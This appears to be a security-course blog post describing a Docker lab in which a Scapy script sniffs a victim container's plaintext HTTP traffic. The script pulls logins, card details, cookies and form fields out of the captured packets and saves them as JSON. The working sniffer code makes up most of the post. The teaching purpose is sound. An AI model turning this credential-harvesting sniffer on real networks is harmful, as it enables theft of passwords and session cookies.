---
layout: post
title: Scapy HTTP Dissection
category: web_security
author: 'reo'
tags: python seclab docker scapy
mathjax: 
---

Here we exploit one of many vulnerabilities of HTTP to create a sniffer
which scrapes traffic sent by Alice over the network.
Our goal is to steal the information including usernames, passwords,
order numbers, etc. sent over the network. We again use the Sacpy library to
acheive this.

Similar to our [previous exercise](http://192.168.0.52:4000/crypto/2020/10/20/06-scapy.html).
we use `sniff()` from the Scapy library and filter the incoming packets to
isolate the ones we are interested in.

## Contents
{:.no_toc}

* Content
{:toc}

<br>

***

## Setup

***

Our docker-compose looks like

```yaml
version: '3'

services:
  alice:
    image: # private image
    container_name: alice
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    dns: 1.1.1.1
    networks:
      channel:
        ipv4_address: 10.0.0.2

  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      cap_add:
        - NET_ADMIN
        - SYS_ADMIN
      volumes:
          - .:/shared
      network_mode: service:alice
      
  wireshark:
    image: # private image
    container_name: wireshark
    tty: true
    network_mode: service:alice

networks:
  channel:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/28
```

We begin with the [usual setup](/crypto/2020/10/08/05-lab.html#setup)
of our labs involving Docker.
Alice again uses nodejs and with `docker-compose up alice` runs

```javascript
const request = require('request');

const server = "e-commerce.seclab.space"

const data = {username: 'alice', password: '4l1c3', cc: '4111111111111111', exp: '12/20', code: '945'};

let do_request = function(){
    let j = request.jar();
    let req = request.defaults({jar:j});
    req.get({url: "http://" + server + "/home?lang=en", timeout: 5000}, function (err, response, body) {
        if (err) return console.log(err);
        if (response.statusCode !== 200) return console.log("[" + protocol + "] [" + response.statusCode + "] " + body);
        let protocol = response.request.uri.protocol.slice(0, -1);
        console.log("[" + protocol + "] GET response received");
        req.post(protocol + "://" + server + "/login", {form: {username: data.username, password: data.password}, timeout: 5000}, function (err, response, body) {
            if (err) return console.log(err);
            if (response.statusCode !== 200) return console.log("[" + protocol + "] [" + response.statusCode + "] " + body);
            protocol = response.request.uri.protocol.slice(0, -1);
            console.log("[" + protocol + "] POST response received");
            req.put(protocol + "://" + server + "/buy?item=lamp&currency=CAD", {form: {cc: data.cc, exp: data.exp, code: data.code}, timeout: 5000}, function (err, response, body){
                if (err) return console.log(err);
                if (response.statusCode !== 200) return console.log("[" + protocol + "] [" + response.statusCode + "] " + body);
                protocol = response.request.uri.protocol.slice(0, -1);
                console.log("[" + protocol + "] PUT response received");
                req.get({url: protocol + "://" + server + "/check", timeout: 5000}, function (err, response, body) {
                    if (err) return console.log(err);
                    protocol = response.request.uri.protocol.slice(0, -1);
                    if (response.statusCode !== 200) return console.log("[" + protocol + "] [" + response.statusCode + "] " + body);
                    console.log("[" + protocol + "] GET response received");
                });
            });
        });
    });
};

do_request();
```

***

## Sniffing Packets

***

We aren't concerned about how Mallory manages to read Alice's packets but rather
the parsing done with Scapy
but one example would be as a
[malicious gateway](/crypto/2020/10/15/06-malgat.html).
We tweak our packet filter to return only our
targeted packets.

```python
import json
from scapy.all import *
from urllib.parse import urlparse, parse_qs

load_layer('http')
load_layer('tls')
load_layer('dns')

results = []

def packet_filter(packet):
    return packet.haslayer(HTTP) and (packet.haslayer(HTTPRequest) or packet.haslayer(HTTPResponse))
```

The main driver is similar to the first Scapy exercise we did.

```python
def run(count, filepath):
    sniff(iface="eth0", lfilter=packet_filter, prn=packet_process, count=count)
    with open(filepath, "w") as file_stream:
        file_stream.write(json.dumps(results, indent=4))
```

<br>

***

## Dissecting the Packets

***

All that remains now is to rip the remaining information from the sniffed packet
and store in a json format for easy reading and parsing.

```python
def packet_process(packet):

    # will store the information from sniffed packet
    result_accumulator = dict()
    http_type = "request" if packet.haslayer(HTTPRequest) else "response"
    result_accumulator["type"] = http_type
    body = ""

    if packet.haslayer(Raw):
        body = packet[Raw].load.decode('utf-8')
    if (http_type == "request"):
        result_accumulator["host"] = packet[HTTPRequest].Host.decode('utf-8')
        result_accumulator["method"] = packet[HTTPRequest].Method.decode('utf-8')
        path = packet[HTTPRequest].Path.decode('utf-8')
        result_accumulator["path"] = path
        if "?" in path:
            query_part = path[path.index("?") + 1:]
            query_dict = parse_qs(query_part)
            for key in query_dict:
                query_dict[key] = query_dict[key][0]
            result_accumulator["query_args"] = query_dict
        if packet[HTTPRequest].Cookie != None:
            cookies = []
            cooks_comps = parse_qs(packet[HTTPRequest].Cookie.decode('utf-8'))
            for key in cooks_comps:
                append_dict = {'key' : key.strip(), 'value' : cooks_comps[key][0]}
                cookies.append(append_dict)
            result_accumulator['cookies'] = cookies
        if (body != ""):
            result_accumulator["body"] = body
            content_type = packet[HTTPRequest].Content_Type
            if ((content_type != None) and (content_type.decode('utf-8') == 'application/x-www-form-urlencoded')):
                form_comps = parse_qs(body)
                form = []
                for key in form_comps:
                    append_dict = {'key': key.strip(), 'value': form_comps[key][0]}
                    form.append(append_dict)
                result_accumulator['form'] = form

    if (http_type == "response"):
        result_accumulator["status_code"] = packet[HTTPResponse].Status_Code.decode('utf-8')
        set_cookie = packet[HTTPResponse].Set_Cookie
        if set_cookie != None:
            cookie_str = set_cookie.decode('utf-8')[:set_cookie.decode('utf-8').index(";")] if ";" in set_cookie.decode('utf-8') else set_cookie.decode('utf-8')
            split_cookie = cookie_str.split("=")
            cookie_dict = {'key' : split_cookie[0], 'value' : split_cookie[1]}
            result_accumulator['cookie'] = cookie_dict
        if (body != ""):
            result_accumulator["body"] = body

    results.append(result_accumulator)
```

Of course, the specifics for what we save depends on what we want to extract but the code featured above
serves as an example.

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.

{% include lab_credits.md %}

